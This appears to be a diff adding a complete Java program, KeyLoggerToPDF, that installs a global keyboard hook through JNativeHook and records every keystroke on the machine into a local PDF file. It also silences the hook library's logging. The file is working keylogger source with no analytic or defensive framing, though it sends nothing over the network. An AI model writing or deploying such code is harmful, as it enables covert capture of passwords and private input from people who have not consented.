@@ -1,0 +1,74 @@
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+import com.itextpdf.text.Document;
+import com.itextpdf.text.DocumentException;
+import com.itextpdf.text.Paragraph;
+import com.itextpdf.text.pdf.PdfWriter;
+
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
+public class KeyLoggerToPDF implements NativeKeyListener {
+
+    private static Document document;
+
+    public KeyLoggerToPDF() {
+        try {
+            document = new Document();
+            PdfWriter.getInstance(document, new FileOutputStream("keystrokes.pdf"));
+            document.open();
+        } catch (DocumentException | IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        try {
+            if (document != null && document.isOpen()) {
+                String key = NativeKeyEvent.getKeyText(e.getKeyCode());
+                document.add(new Paragraph(key));
+            }
+        } catch (DocumentException ex) {
+            ex.printStackTrace();
+        }
+    }
+
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent e) {
+        // Optional
+    }
+
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent e) {
+        // Optional
+    }
+
+    public static void main(String[] args) {
+        // Disable JNativeHook logging
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.OFF);
+
+        try {
+            GlobalScreen.registerNativeHook();
+        } catch (Exception e) {
+            e.printStackTrace();
+            System.exit(1);
+        }
+
+        KeyLoggerToPDF listener = new KeyLoggerToPDF();
+        GlobalScreen.addNativeKeyListener(listener);
+
+        // Add shutdown hook to close PDF properly
+        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
+            if (document != null && document.isOpen()) {
+                document.close();
+                System.out.println("PDF saved.");
+            }
+        }));
+    }
+}
